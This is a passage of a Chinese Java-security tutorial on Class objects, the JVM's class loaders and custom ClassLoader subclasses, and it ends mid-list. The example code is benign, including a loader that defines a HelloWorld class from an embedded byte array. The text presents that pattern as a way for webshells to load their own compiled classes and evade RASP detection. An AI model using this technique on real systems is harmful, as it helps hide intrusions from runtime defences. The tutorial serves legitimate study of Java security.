        <content type="html"><![CDATA[<blockquote><p>本节聚焦于ClassLoader这个类加载器展开</p></blockquote><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><blockquote><p>和python的类对象有一些理解上的相似之处</p></blockquote><ol><li><em><strong>简短总结</strong></em><ol><li>JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息；获取一个class对应的Class实例后，就可以<strong>获取该class的所有信息；通过Class实例获取class信息的方法称为反射（Reflection）</strong></li><li>基本类型boolean，byte，char，short，int，long，float，double和关键字void同样表现为 <strong>class 对象</strong>。数组同样也被映射为class 对象的一个类，所有具有相同元素类型和维数的数组都共享该 Class 对象</li><li>JVM总是<strong>动态加载class</strong>，可以在运行期根据条件来控制加载class</li><li>手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在<strong>同名.class的文件中</strong>(字节码文件)</li><li>每个通过关键字class标识的类，<strong>在内存中有且只有一个与之对应的Class对象来描述其类型信息</strong>，无论创建多少个实例对象，其依据的都是用一个Class对象。</li><li>Class类只存私有构造函数，因此对应<strong>Class对象只能有JVM创建和加载</strong></li></ol></li><li>Class类，Class类也是一个实实在在的类，存在于JDK的java.lang包中。Class类的实例表示java应用运行时的类(class ans enum)或接口(interface and annotation)，每个java类运行时都在JVM里表现为一个class对象，可通过下列反射方法<strong>获取Class对象</strong><ol><li>类名.class</li><li>类型.getClass()</li><li>Class.forName(“类名”)。</li></ol></li></ol><h2 id="Java类的加载机制"><a href="#Java类的加载机制" class="headerlink" title="Java类的加载机制"></a>Java类的加载机制</h2><ol><li>java加载机制<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.png" alt="java加载机制"></li><li>java类加载<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.png" alt="java类加载"></li><li>Java类加载方式分为显式和隐式,显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类</li></ol><h2 id="什么是ClassLoader"><a href="#什么是ClassLoader" class="headerlink" title="什么是ClassLoader"></a>什么是ClassLoader</h2><h3 id="宏观介绍"><a href="#宏观介绍" class="headerlink" title="宏观介绍"></a>宏观介绍</h3><ol><li><p>ClassLoader是一个抽象类：用于加载“字节码”到Class对象</p><ol><li><strong>数组类的ClassLoader:(来自于源码注释)</strong> 每个 Java 类都有一个引用指向加载它的 ClassLoader。不过，数组类不是通过 ClassLoader 创建的，而是 JVM 在需要的时候自动创建的，数组类通过getClassLoader()方法获取 ClassLoader 的时候和该数组的元素类型的 ClassLoader 是一致的</li><li><strong>类加载器的主要作用</strong>: 加载 Java 类的字节码（ .class 文件）到 JVM 中（在内存中生成一个代表该类的 Class 对象）。 字节码可以是 Java 源程序（.java文件）经过 javac 编译得来，也可以是通过工具动态生成或者通过网络下载得来<ol><li><strong>额外功能</strong>: 类加载器还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A class loader is an object that is responsible for loading classes. The</span></span><br><span class="line"><span class="comment"> * class &lt;tt&gt;ClassLoader&lt;/tt&gt; is an abstract class.  Given the &lt;a</span></span><br><span class="line"><span class="comment"> * href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of a class, a class loader should attempt to</span></span><br><span class="line"><span class="comment"> * locate or generate data that constitutes a definition for the class.  A</span></span><br><span class="line"><span class="comment"> * typical strategy is to transform the name into a file name and then read a</span></span><br><span class="line"><span class="comment"> * &quot;class file&quot; of that name from a file system.</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="JVM中三个重要的内置ClassLoader"><a href="#JVM中三个重要的内置ClassLoader" class="headerlink" title="JVM中三个重要的内置ClassLoader"></a>JVM中三个重要的内置ClassLoader</h3><ol><li>BootstrapClassLoader(启动类加载器)：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK <strong>内部的核心类库</strong>（ %JAVA_HOME%&#x2F;lib目录下的 rt.jar、resources.jar、charsets.jar等 jar 包和类）以及被 -Xbootclasspath参数指定的路径下的所有类<ol><li><strong>Q: 为什么获取到 ClassLoader 为null就是 BootstrapClassLoader 加载的呢?</strong><ol><li>A: BootstrapClassLoader 由 C++ 实现，由于这个 C++ 实现的类加载器在 Java 中是没有与之对应的类的，所以拿到的结果是 null</li></ol></li></ol></li><li>ExtensionClassLoader(扩展类加载器)：主要负责加载 %JRE_HOME%&#x2F;lib&#x2F;ext 目录下的 jar 包和类以及被 java.ext.dirs 系统变量所指定的路径下的所有类。<strong>主要用来加载拓展类</strong></li><li>AppClassLoader(应用程序类加载器)：面向我们用户的加载器，负责加载<strong>当前应用classpath下的所有jar包和类</strong></li><li><strong>特点</strong><ol><li><p>除了 BootstrapClassLoader 是 JVM 自身的一部分之外，其他所有的类加载器都是在 JVM 外部实现的，并且全都继承自 ClassLoader抽象类</p></li><li><p>获取继承关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">printCL</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> printCL.class.getClassLoader();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">split</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;|--&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ifContinue</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (ifContinue) &#123;</span><br><span class="line">            System.out.println(split.toString()+classLoader);</span><br><span class="line">            <span class="keyword">if</span> (classLoader==<span class="literal">null</span>) &#123;</span><br><span class="line">                ifContinue = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                classLoader = classLoader.getParent();</span><br><span class="line">                split.insert(<span class="number">0</span>,<span class="string">&#x27;\t&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">|--sun.misc.Launcher$AppClassLoader@500ab58d</span><br><span class="line">   |--sun.misc.Launcher$ExtClassLoader@6f156508</span><br><span class="line">      |--<span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><blockquote><ol><li><strong>基础类库</strong>: rt.jar：rt 代表“RunTime”，rt.jar是 Java 基础类库，包含 Java doc 里面看到的所有的类的类文件。也就是说，我们常用内置库 java.xxx.*都在里面，比如java.util.*、java.io.*、java.nio.*、java.lang.*、java.sql.<em>、java.math.</em></li><li><strong>模块加载器</strong>: Java 9 引入了模块系统，并且略微更改了上述的类加载器。扩展类加载器被改名为平台类加载器（platform class loader）。Java SE 中除了少数几个关键模块，比如说 java.base 是由启动类加载器加载之外，其他的模块均由平台类加载器所加载</li></ol></blockquote><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ol><li><p>如果我们要自定义自己的类加载器，很明显需要继承ClassLoader抽象类，ClassLoader类有两个关键的方法可以使用<code>@Override</code>来自己实现</p><ol><li><code>protected Class loadClass(String name, boolean resolve)</code>: 加载指定二进制名称的类，实现了<strong>双亲委派机制</strong>。name 为类的二进制名称，resolve 如果为 true，在加载时调用 <strong>resolveClass(Class&lt;?&gt; c)</strong> 方法解析该类 –&gt; <strong>检查类是否已经加载，如果没有加载，则调用 findClass 方法来加载类</strong></li><li><code>protected Class findClass(String name)</code>: 根据类的二进制名称来查找类，默认实现是空方法 –&gt; <strong>在类没有被加载的情况下，是从特定的源（如文件系统、网络等）加载类的字节码，并将其转换为Class对象</strong></li></ol><blockquote><p>from 官方api<br>建议 ClassLoader的子类重写 findClass(String name)方法而不是loadClass(String name, boolean resolve) 方法。<br>实践建议：不想打破双亲委派模型就findClass覆写，想打破双亲委派模型则需要重写 loadClass() 方法</p></blockquote></li></ol><h4 id="自定义的例子"><a href="#自定义的例子" class="headerlink" title="自定义的例子"></a>自定义的例子</h4><blockquote><ol><li>例子一：某个类根本就不存在于我们的classpath，那么我们可以使用自定义类加载器重写findClass方法，然后在调用defineClass方法，来实现加载并调用方法</li><li>例子二: 利用自定义类加载器我们可以在webshell中实现加载并<strong>调用自己编译的类对象</strong>，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）</li></ol></blockquote><ol><li><p>详见<a href="https://www.javasec.org/javase/ClassLoader/#%E8%87%AA%E5%AE%9A%E4%B9%89classloader">这个章节</a></p></li><li><p>重写<code>findClass()</code>方法，从指定root读取类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pdai.jvm.classloader;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classData = loadClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadClassData(String className) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> root + File.separatorChar</span><br><span class="line">                + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[bufferSize];</span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((length = ins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(String root)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line">        classLoader.setRoot(<span class="string">&quot;D:\\temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; testClass = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            testClass = classLoader.loadClass(<span class="string">&quot;com.pdai.jvm.classloader.Test2&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line">            System.out.println(object.getClass().getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>webshell自动加载类型</strong></em></p><ol><li>也是重写了<code>findClass()</code>方法，直接从字节码进行加载</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="ClassLoader的加载流程"><a href="#ClassLoader的加载流程" class="headerlink" title="ClassLoader的加载流程"></a>ClassLoader的加载流程</h2><blockquote><p>详细流程[<a href="https://pdai.tech/md/java/jvm/java-jvm-classload.html]">https://pdai.tech/md/java/jvm/java-jvm-classload.html]</a></p></blockquote><h3 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h3><ol><li><strong>类加载一般有三种方式</strong><ol><li>命令行启动应用时候由JVM初始化加载</li><li>通过Class.forName()方法动态加载</li><li>通过ClassLoader.loadClass()方法动态加载</li></ol></li><li>区别<ol><li>Class.forName(): 